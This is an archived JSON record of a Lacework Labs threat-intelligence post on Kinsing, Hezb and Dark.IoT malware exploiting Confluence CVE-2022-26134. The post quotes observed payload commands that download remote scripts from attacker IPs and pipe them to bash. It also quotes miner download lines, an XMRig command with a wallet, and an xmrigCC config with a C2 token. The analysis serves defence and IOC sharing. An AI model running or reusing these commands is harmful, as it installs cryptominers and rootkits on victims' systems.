{
    "id": "7951ca09-d22f-493e-9cdd-54c516d0a2df",
    "created_at": "2023-01-12T15:03:11.923876Z",
    "updated_at": "2025-03-27T02:17:01.041211Z",
    "deleted_at": null,
    "sha1_hash": "1879f26943421a154a3b46b7761db286b91ed378",
    "title": "2022-06-07 - Kinsing & Dark.IoT botnet among threats targeting CVE-2022-26134",
    "authors": "",
    "file_creation_date": "2022-06-18T23:17:33Z",
    "file_modification_date": "2022-06-18T23:17:33Z",
    "file_size": 1030623,
    "plain_text": "# Kinsing & Dark.IoT botnet among threats targeting CVE-2022-26134\n\n**[lacework.com/blog/kinsing-dark-iot-botnet-among-threats-targeting-cve-2022-26134/](https://www.lacework.com/blog/kinsing-dark-iot-botnet-among-threats-targeting-cve-2022-26134/)**\n\nChris Hall - Cloud Security Researcher - Lacework Labs\n\nJune 7, 2022\n\n\nJune 7, 2022\n\n\n-----\n\n[Details regarding the recent Confluence OGNL (CVE-2022-26134) exploit were released to the public on June 3rd 2022.](https://www.lacework.com/blog/security-advisory-cve-2022-26134-rce-in-multiple-atlassian-products/)\nShortly following this, Lacework Labs began seeing multiple attacks in the wild from both uncategorized and named\n[threats. While this was expected, there appears to be more widespread exploitation of CVE-2022-26134 compared to](https://www.lacework.com/blog/security-advisory-cve-2022-26134-rce-in-multiple-atlassian-products/)\n[previous Confluence vulnerabilities.](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-6258/Atlassian-Confluence.html)\n\nAs of this writing we have observed active exploitation by known Cloud threat malware families such as Kinsing, “Hezb”,\nand the Dark.IoT botnet. This blog provides a current inventory of top threats seen exploiting this latest Confluence\nvulnerability. [Additional IOCs associated with this vulnerability are included in our Github repo.](https://github.com/lacework/lacework-labs/blob/master/blog/CVE-2022-26134_IOCs.csv)\n\n## Kinsing\n\n[Kinsing is often one of the first threats to add a new exploit to their toolbox, and CVE-2022-26134 was no different. One](https://info.lacework.com/rs/016-ATL-295/images/lacework-cloud-threat-report-vol3.pdf)\ninteresting development was the use of a new malware host – 195.2.79.26 for the Kinsing installer. This is noteworthy\nbecause Kinsing often leverages legacy infrastructure in their attacks. Observed payload commands for CVE-202226134:\n```\n/bin/sh -c wget -q -O - http://185.191.32.198/cf.sh | bash &amp;gt; /dev/null 2&amp;gt;&amp;amp;1\nbash -c (curl -s 195.2.79.26/cf.sh||wget -q -O- 195.2.79.26/cf.sh)|bash\n\n```\nThe initial payload cf.sh is currently not available on VirusTotal. However, it’s a typical installer which downloads and runs\n[the Kinsing H2miner malware as well as a userland level rootkit via libsystem.so. This shared object in turn would be](https://www.virustotal.com/gui/file/5d2530b809fd069f97b30a5938d471dd2145341b5793a70656aad6045445cf6d)\n[leveraged in LD_PRELOAD attacks (T1574.006).](https://attack.mitre.org/techniques/T1574/006/)\n\n## Hezb\n\n\n-----\n\nAnother threat, dubbed Hezb based on command line artifact data, was observed around Kinsing. This malware is\n[relatively new and was recently reported in late May exploiting WSO2 RCE (CVE-2022-29464) in the wild. Several](https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html)\nmalware components were observed, the first of which was an XMRig miner installed as “Hezb”. Additional modules\nincluded a polkit exploit for privilege escalation as well as a zero-detection ELF payload named “kik”. The following table\nlists observed artifacts and descriptions.\n\nCMDLINE artifacts Description\n\n```\ncurl -o hezb http://202.28.229.174/sys.x86_64\nhezb -o 199.247.0.216:80 -u \n46HmQz11t8uN84P8xgThrQXSYm434VC7hhNR8be4QrGtM1Wa4cDH2GkJ2NNXZ6Dr4bYg6phNjHKYJ1QfpZRBFYW5V6\nqnRJN -p ap8 -k -B\nbash -c curl 202.28.229.174/root.sh|bash\ncurl -o kik http://202.28.229.174/kik\n\n```\n\nInitial payload\ncommand – XMRig\n\nXMRig configuration\ncommand. XMRig\nusername.\nUsername first seen\nin [early May with](https://www.virustotal.com/gui/search/content%253A%252246HmQz11t8uN84P8xgThrQXSYm434VC7hhNR8be4QrGtM1Wa4cDH2GkJ2NNXZ6Dr4bYg6phNjHKYJ1QfpZRBFYW5V6qnRJN%2522/files)\nvarious malware\n\nSecond stage\ninstaller\nAttempts to run [ap.sh](https://www.virustotal.com/gui/file/b0f4ad9535f4df8f5448c3c201449e24c974ffd25d7a3086caa2089d6527544d/content)\nvia polkit privilege\nescalation\n```\n./ko -o dom\nhttp://202.28.229.1\n74/ko\n\n```\nZero detection ELF\nbinary\n\n\nPrior to the Hezb miner, another XMRig variant was observed and is believed to belong to the same group via shared\n[infrastructure. This miner is a variant of xmrigCC which is a modified version of XMRig with C2 capabilities. Payload](https://github.com/Bendr0id/xmrigCC)\ncommand:\n```\ncurl http://134.213.29.14:32953/2/c2/java.tar.gz --output /var/tmp/java.tar.gz\n\n```\nStatic configurations:\n\n\n-----\n\n```\n p [\n {\n  \"algo\": null,\n  \"coin\": null,\n  \"url\": \"91[.]217[.]81[.]162:443\",\n  \"pass\": \"x\",\n  \"rig-id\": \"con2022\",\n  \"nicehash\": false,\n  \"keepalive\": false,\n  \"enabled\": true,\n  \"tls\": true,\n  \"tls-fingerprint\": null,\n  \"daemon\": false,\n  \"socks5\": null,\n  \"self-select\": null,\n  \"submit-to-origin\": false\n }\n],\n\"cc-client\": {\n \"enabled\": true,\n \"url\": \"91.217.81.162:80\",\n \"access-token\": \"sd893Lkhsdg81LKjgpqffss4KLjjsl\",\n \"use-tls\": false,\n \"use-remote-logging\": true,\n \"upload-config-on-start\": true,\n \"worker-id\": null,\n \"reboot-cmd\": null,\n \"update-interval-s\": 60\n},\n\n```\n**Privilege Escalation via pwnkit (binary name: ko)**\n\n[CVE-2021-4034 released earlier this year resulted in privilege escalation via a bug in the SETUID application “polkit”. The](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)\naptly named “pwnkit” exploit was observed being spread within droppers taking advantage of the most recent confluence\nvulnerability.The image below shows the Ghidra decompilation for this utility, aligning to many of the public proof-ofconcept exploits that exist on Github for this vulnerability.\n\n\n-----\n\nFigure 1. Hezb component Ko\n\n**Post Execution Payload – Kik**\n\nKik is a statically linked, non-stripped 64-bit Golang ELF binary. This binary attempts to match for specific values while\nexcluding others and pipes the resulting values to “kill -9”.This is executed in a while true loop printing out “command\nexecuted successfully” to stdout.\n\nFigure 2. Hezb component Kik\n\n## Dark.IoT\n\nA unique Mirai variant was also installed as “x” and was downloaded from host 136.144.41.171. Observed commands:\n```\n/bin/sh -c wget -q -O - 136.144.41.171/atl | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1\n get 136 144 41 171/\n\n```\n\n-----\n\nThis [malware is characterized by alternative DNS connections and connects to several .lib domains using custom DNS](https://www.virustotal.com/gui/file/a2d3c868667e2b702c9894b297237247a9b106622e4b1be54cb068a7ba9fe08c/relations)\nservers. The following observed DNS servers, hostnames and resolutions were observed:\n\nC2 host DNS Servers Resolved IPs\n\n```\ntempest.l\nib\ndragon.li\nb\nblacknurs\ne.lib\nbabaroga.\nlib\n\n```\n```\n94.247.43.25\n4\n95.217.229.2\n11\n162.243.19.4\n7\n94.16.114.25\n4\n194.36.144.8\n7\n95.217.229.2\n11\n162.243.19.4\n7\n94.16.114.25\n4\n144.76.157.2\n42\n94.247.43.25\n4\n194.36.144.8\n7\n95.217.229.2\n11\n144.76.157.2\n42\n94.16.114.25\n4\n95.217.229.2\n11\n162.243.19.4\n7\n94.247.43.25\n4\n\n```\n```\n62.4.23.97\n193.70.30.98\n5.206.227.24\n4\n203.0.113.0\n\n```\n\nThis set of Mirai activity was [reported in September 2021 targeting Realtek devices as part of the Dark.IoT botnet.](https://blogs.juniper.net/en-us/threat-research/attacks-continue-against-realtek-vulnerabilities)\nDark.IoT is a prolific botnet that has expanded its activity beyond targeting of IoT devices, for example with an Oracle\nweblogic exploit and [targeting of Azure Open Management infrastructure.](https://twitter.com/0xrb/status/1440219730506174466)\n\nExploits involving Confluence are always popular among various threats including those targeting cloud. While Lacework\nLabs observed a lot of activity relative to other exploits, there is still low exposure compared to the more impactful “coffee\nbreak” vulnerabilities such as those involving log4j or apache. For a complete list of IoCs observed in CVE-2022-26134\n[exploitation, refer to our Github. For more content like this, check us out on Twitter and](https://github.com/lacework/lacework-labs/blob/master/blog/CVE-2022-26134_IOCs.csv) [LinkedIn!](https://www.linkedin.com/showcase/lacework-labs)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-07 - Kinsing & Dark.IoT botnet among threats targeting CVE-2022-26134.pdf"
    ],
    "report_names": [
        "2022-06-07 - Kinsing & Dark.IoT botnet among threats targeting CVE-2022-26134.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0409120f-2b1f-4edd-a696-75d312eb2890",
            "created_at": "2023-01-06T13:46:39.463928Z",
            "updated_at": "2025-03-27T02:00:03.09996Z",
            "deleted_at": null,
            "main_name": "Hezb",
            "aliases": [
                "Mimo"
            ],
            "source_name": "MISPGALAXY:Hezb",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535791,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1655594253,
    "ts_modification_date": 1655594253,
    "files": {
        "pdf": "https://archive.orkl.eu/1879f26943421a154a3b46b7761db286b91ed378.pdf",
        "text": "https://archive.orkl.eu/1879f26943421a154a3b46b7761db286b91ed378.txt",
        "img": "https://archive.orkl.eu/1879f26943421a154a3b46b7761db286b91ed378.jpg"
    }
}